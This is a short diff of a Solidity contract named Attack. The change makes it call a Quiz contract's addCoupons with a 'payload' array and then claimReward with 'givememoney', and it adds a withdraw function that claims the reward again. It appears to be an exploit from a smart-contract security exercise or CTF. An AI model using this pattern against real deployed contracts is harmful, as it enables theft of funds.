@@ -9,12 +9,19 @@ import "./Quiz.sol";
 
 contract Attack {
     Quiz public quiz;
+    string[] array = ["this", "is", "payload"];
 
     constructor(address _quiz) {
         quiz = Quiz(payable(_quiz));
     }
 
     function attack()external {
-        quiz.getCoupons();
+        quiz.addCoupons(array);
+        quiz.claimReward("givememoney");
     }
+
+    function withdraw()external payable{
+       quiz.claimReward("givememoney"); 
+    }
+
 }
